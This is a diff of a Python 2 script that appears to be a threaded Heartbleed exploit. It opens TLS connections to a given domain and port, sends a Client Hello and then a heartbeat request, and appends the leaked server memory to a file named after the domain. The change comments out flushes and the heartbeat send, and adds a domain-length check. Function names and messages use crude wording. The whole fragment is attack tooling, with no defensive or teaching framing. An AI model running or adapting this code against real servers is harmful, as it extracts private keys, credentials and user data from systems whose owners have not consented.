@@ -120,13 +120,13 @@ def fuckit(domain,port,fn):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             #print 'Connecting...'
-            sys.stdout.flush()
+            #sys.stdout.flush()
             s.connect((domain, port))
             #print 'Sending Client Hello...'
-            sys.stdout.flush()
+            #sys.stdout.flush()
             s.send(hello)
             #print 'Waiting for Server Hello...'
-            sys.stdout.flush()
+            #sys.stdout.flush()
             while True:
                 typ, ver, pay = recvmsg(s)
                 if typ == None:
@@ -136,8 +136,8 @@ def fuckit(domain,port,fn):
                 if typ == 22 and ord(pay[0]) == 0x0E:
                     break
             #print 'Sending heartbeat request...'
-            sys.stdout.flush()
-            s.send(hb)
+            #sys.stdout.flush()
+            #s.send(hb)
             hit_hb(s,fn)
             s.close()
         except Exception as e:
@@ -153,6 +153,9 @@ def main():
             port=int(indata.split(':')[1])
         except:
             port=443 
+        if len(domain)<5:
+						print 'wrong domain'
+						continue
         print 'fucking '+domain+' @ port '+str(port)+'...'
         fn=open(domain+'.bin','ab')
         for j in xrange(THREADS):
